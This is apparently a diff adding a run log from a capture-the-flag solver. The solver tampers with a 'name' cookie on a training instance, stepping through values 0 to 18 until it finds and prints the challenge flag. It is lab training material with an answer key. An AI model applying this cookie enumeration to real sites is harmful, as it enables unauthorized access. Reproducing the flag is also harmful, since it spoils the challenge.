@@ -1,0 +1,26 @@
+Data da execução: 11/11/2026
+Comando: python scripts/resolver.py cookies --url http://chatelaine.cylabacademy.net:48298/
+
+Instância: http://chatelaine.cylabacademy.net:48298
+Rota após a pesquisa: /check
+Cookie após a pesquisa: name=0
+name=0: sem flag
+name=1: sem flag
+name=2: sem flag
+name=3: sem flag
+name=4: sem flag
+name=5: sem flag
+name=6: sem flag
+name=7: sem flag
+name=8: sem flag
+name=9: sem flag
+name=10: sem flag
+name=11: sem flag
+name=12: sem flag
+name=13: sem flag
+name=14: sem flag
+name=15: sem flag
+name=16: sem flag
+name=17: sem flag
+name=18: flag encontrada
+Flag: academy{3v3ry1_l0v3s_c00k135_90a3a7cb}
